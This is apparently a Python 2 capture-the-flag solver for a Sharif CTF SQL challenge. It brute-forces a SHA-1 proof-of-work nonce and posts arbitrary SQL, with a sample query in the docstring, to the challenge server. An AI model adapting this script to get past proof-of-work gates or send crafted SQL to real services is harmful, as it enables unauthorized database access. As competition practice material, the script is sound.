'''
"select * from messages order by (case when msg like '%Sharif%' then 1 else 0 end) desc"
'''

import requests, hashlib, time, sys

def query(sql):
	r = requests.get("http://ctf.sharif.edu:36455/chal/sql/")
	nonce = r.text.split("\n")[7].split(" ")[1]
	i = 1
	s = ''
	print 'looking for collision'
	start = time.time()
	while True:
		if i%1000000 == 0:
			print i
			print time.time() - start, "s"
		s = str(i) + nonce
		m = hashlib.sha1()
		m.update(s)
		if m.hexdigest()[0:5] == '00000':
			break
		i += 1
	print "found collision: " + str(i)
	r = requests.post("http://ctf.sharif.edu:36455/chal/sql/", cookies = r.cookies, data={"pow":str(i), "sql":sql} )
	print r.text

query(sys.argv[1])
